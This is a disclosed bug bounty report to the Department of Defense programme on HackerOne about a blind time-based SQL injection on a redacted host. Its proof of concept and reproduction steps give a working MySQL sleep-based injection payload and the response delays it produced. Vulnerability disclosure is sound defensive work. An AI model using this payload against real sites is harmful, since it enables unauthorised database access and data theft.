# Blind Sql Injection https:/████████

## Report Details
- **Report ID**: 2020429
- **URL**: https://hackerone.com/reports/2020429
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-06-10T09:32:28.973Z
- **Disclosed**: 2023-06-30T17:51:52.063Z

## Reporter
- **Username**: codeslayer1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
found on the websitehttps://████████ weakness is vulnerable to a blind sql injection.

POC: https:/█████████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
Tests Payload performed:
    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
    0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z => 10.740
	0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z => 2.714
    0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z => 1.927

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.
  
Best regards,
CodeSlayer137

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
